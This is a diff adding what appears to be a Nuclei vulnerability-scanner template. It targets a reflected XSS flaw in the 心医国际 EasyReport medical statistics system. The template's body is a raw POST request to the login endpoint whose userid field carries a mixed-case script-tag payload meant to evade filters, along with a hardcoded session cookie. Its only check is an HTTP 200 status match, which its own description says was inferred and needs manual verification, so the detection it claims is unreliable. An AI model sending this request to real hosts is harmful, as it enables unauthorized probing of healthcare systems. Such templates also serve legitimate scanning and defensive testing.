@@ -1,0 +1,43 @@
+id: poc-9b8a4528cc82a5f35126
+info:
+  name: 心医国际医技统计报表系统存在XSS漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9b8a4528cc82a5f351267065fc08a4c8
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: xss,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 9b8a4528cc82a5f351267065fc08a4c8
+http:
+- raw:
+  - 'POST /EasyReport/login.do?method=handleRequestInternal HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+    Content-Length: 55
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: JSESSIONID=E590069FD1A0C5B3ACA365A9A270FD01
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Encoding: gzip
+
+
+    pwd=admin&userid="><ScRiPt>alert(1)</sCrIpT>&userrole=0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
